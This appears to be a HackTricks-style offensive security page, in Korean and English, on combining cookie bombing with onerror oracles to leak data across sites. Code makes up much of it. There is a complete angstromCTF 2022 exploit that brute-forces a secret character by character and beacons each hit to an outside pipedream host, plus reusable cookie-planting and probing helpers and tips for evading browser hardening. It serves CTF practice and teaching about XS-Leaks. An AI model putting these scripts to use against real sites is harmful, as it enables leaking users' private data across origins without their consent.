# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

이 기술은 다음을 결합합니다:
- Cookie bombing: 피해자의 브라우저에 대상 오리진용 많은/큰 쿠키를 채워 이후 요청이 서버/요청 한도(요청 헤더 크기, 리다이렉트 시 URL 길이 등)에 도달하게 만듭니다.
- Error-event oracle: cross-origin endpoint를 `<script>`(또는 다른 서브리소스)로 탐침하고 `onload` vs `onerror`로 상태를 구분합니다.

핵심 아이디어
- 테스트하려는 두 상태(예: 검색에서 “hit” vs “miss”)에 대해 동작이 다른 대상 엔드포인트를 찾습니다.
- “hit” 경로가 긴 리다이렉트 체인이나 긴 URL을 유발하고 “miss” 경로는 짧게 유지되도록 합니다. 많은 쿠키로 요청 헤더를 부풀려 오직 “hit” 경로만 HTTP 에러(예: 431/414/400)를 일으켜 서버가 실패하게 만듭니다. 그 에러가 onerror 이벤트를 전환하여 XS-Search의 오라클이 됩니다.

언제 작동하는가
- 피해자의 브라우저가 대상에 쿠키를 전송하게 할 수 있어야 합니다(예: 쿠키가 SameSite=None이거나 popup의 `window.open`을 통해 first-party context에서 설정할 수 있는 경우).
- 임의의 쿠키를 설정하도록 악용할 수 있는 앱 기능(예: 제어 가능한 입력 이름/값을 Set-Cookie로 바꾸는 “save preference” 엔드포인트)이나, 공격자가 제어하는 데이터를 URL에 포함하는 post-auth 리다이렉트를 만들 수 있는 기능이 있어야 합니다.
- 서버가 두 상태에서 다르게 반응하고, 헤더/URL이 부풀려질 때 한 상태가 한도를 넘어 에러 응답을 반환하여 onerror를 트리거해야 합니다.

서버 에러를 오라클로 사용하는 것에 대한 주의
- 쿠키로 요청 헤더가 부풀려질 때 일반적으로 431 Request Header Fields Too Large가 반환됩니다; 긴 요청 대상의 경우 414 URI Too Long 또는 서버 특정 400이 반환될 수 있습니다. 이들 중 어느 것이라도 서브리소스 로드 실패를 초래하고 onerror를 발생시킵니다. 과도한 쿠키와 같은 일반 원인에 대해서는 [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431)를 참조하세요.

<details>
<summary>실전 예시 (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

왜 팝업 (`window.open`)인가?
- 최신 브라우저는 점점 더 서드파티(제3자) 쿠키를 차단합니다. 타깃에 최상위 창을 열면 쿠키가 퍼스트파티가 되어 Set-Cookie 응답이 유지되므로 cookie-bomb 단계가 서드파티 쿠키 제한이 있어도 작동합니다.

2024–2025 쿠키 가용성 관련 노트
- Chrome의 Tracking Protection 롤아웃(2024년 1월)은 이미 무작위 코호트에 대해 서드파티 쿠키를 차단하고 있으며, UK CMA가 승인하면 전체 사용자 대상으로 확대될 예정이므로 어떤 피해자도 갑자기 3P 쿠키를 잃을 수 있다고 가정하십시오. 폴백을 자동화하세요: 스크립트 프로브가 타깃에 전혀 도달하지 못하고 실패할 때를 감지하고 투명하게 팝업/퍼스트파티 흐름으로 전환하세요. Safari와 Firefox는 이미 대부분의 서드파티 쿠키를 기본으로 차단하며 CHIPS/partitioned cookies는 각 최상위 사이트가 이제 자체 쿠키 저장소를 갖게 됨을 의미합니다.
- 퍼스트파티 쿠키 심기 흐름(`window.open` + cookie-setting 엔드포인트로 자동 제출)을 사용한 뒤, 그 쿠키들이 전송될 때만 성공하는 서브리소스로 프로브하세요. 서드파티 쿠키가 차단된 경우 프로브를 same-site 컨텍스트로 옮기십시오(예: 팝업에서 same-site 가젯으로 oracle을 실행하고 `postMessage`나 서버로의 beacon으로 불리언을 유출), 또는 정당하게 제어하는 경우 피해자 오리진을 Chrome의 de프리케이션 트라이얼에 등록하세요.

<details>
<summary>Tracking-Protection에 안전한 퍼스트파티 심기 도우미</summary>

교차 사이트 컨텍스트에서 수십 개의 쿠키를 채워야 할 때는, 임시 최상위 창을 띄워 취약한 Set-Cookie 엔드포인트로 과도한 크기의 폼 제출을 연속으로 전송하세요:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
probing을 시작하기 바로 전에 호출하면 모든 oracle run이 새로 채워진 cookie jar로 시작합니다.

</details>

범용 probing 도우미
이미 target origin (first-party)에 많은 cookies를 설정할 수 있는 방법이 있다면, 이 minimal oracle을 success/failure에 따라 서로 다른 network outcomes (status/MIME/redirect)를 초래하는 모든 endpoint에 재사용할 수 있습니다:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
대체 tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Advanced: de Bruijn–based cookie packing (CTF-proven)
- 앱이 큰 cookie values를 제어할 수 있게 해주면, 각 probe에 de Bruijn sequence를 덧붙여 추측을 효율적으로 패킹할 수 있다. 이렇게 하면 per‑probe overhead가 작게 유지되면서 heavy branch가 올바른 prefix에 대해서만 일관되게 더 무거워지도록 보장한다. |Σ| 심볼 길이 n에 대한 예제 생성기 (cookie value에 들어감):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

팁 — oracle를 구축하는 방법
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
  - “positive” 상태를 더 무겁게 만들어라: 술어가 참일 때만 추가 redirect를 체인하거나, redirect URL이 무제한 사용자 입력을 반영해 추정한 접두사에 따라 커지도록 만들어라.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
  - 헤더를 부풀려라: cookie bombing을 반복해 “heavy” 경로에서 일관된 오류가 관찰될 때까지. 서버는 일반적으로 헤더 크기에 한도를 두며 많은 cookie가 있을 때 더 빨리 실패한다.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
  - 안정화: 여러 병렬 cookie 설정 작업을 실행하고 반복적으로 프로브해서 타이밍 및 캐시 노이즈를 평균화하라.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
  - 캐시를 무력화하고 풀링 아티팩트를 피하라: 프로브 URL에 무작위 `#fragment` 또는 `?r=`를 추가하고 `window.open` 루프에서는 서로 다른 창 이름을 사용하라.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.
  - 대체 서브리소스: `<script>`가 필터링되면 `<link rel=stylesheet>`나 `<img>`를 시도하라. onload/onerror boolean이 oracle이며, 콘텐츠는 파싱될 필요가 없다.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).
  - 리버스 프록시/CDN과 서버는 서로 다른 한도를 적용한다. 2025년 10월 기준 Cloudflare는 edge에서 요청 헤더 총합 128 KB(및 URL 16 KB)를 문서화하고 있어, 대상이 그 뒤에 있을 경우 더 많거나 더 큰 cookie가 필요할 수 있다. 다른 스택(예: Apache의 LimitRequestFieldSize)은 종종 헤더 라인당 약 ~8 KB에 가깝고 더 빨리 오류가 발생하므로 bomb 크기를 조정하라 (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
  - Firefox 139/ESR 128.11(2025년 5월)는 교차 출처 리소스에 대한 script 태그의 load/error 집계를 강화했다(CVE-2025-5266). 패치된 클라이언트에서는 특정 리디렉션 응답에 대해 `onerror` 신호가 억제될 수 있으므로 oracle을 다각화하라(병렬 `<link rel=stylesheet>`, `<img>` 또는 MIME 불일치 `fetch`) 및 boolean이 여전히 동작한다고 가정하기 전에 피해자 UA를 지문화하라.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.
  - Tracking Protection 또는 Fetch Metadata 정책이 적용된 엔터프라이즈 Chromium 빌드는 간헐적으로 cookie를 제거하거나 redirect를 재작성할 수 있다. 먼저 짧은 엔드포인트를 프로브해 이러한 경우를 감지하라; 실패하면 자동으로 팝업 내부에서 전체 공격을 실행하고 `postMessage`/`BroadcastChannel`을 통해 비트를 전달하도록 전환하라.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:
  - 매우 긴 요청 대상을 강제할 수 있을 때는 cookie가 필요 없는 URL 길이 기반 오라클을 결합하거나 대신 사용할 수 있다:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.
  - 이 공격군은 넓게 “Error Events” XS-Leaks로 논의된다. cookie-bomb 단계는 서버 한계 너머로 단 하나의 분기만 밀어 넣기 위한 편리한 방법일 뿐이며, 신뢰할 수 있는 boolean oracle을 생성한다.

## 참고자료
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
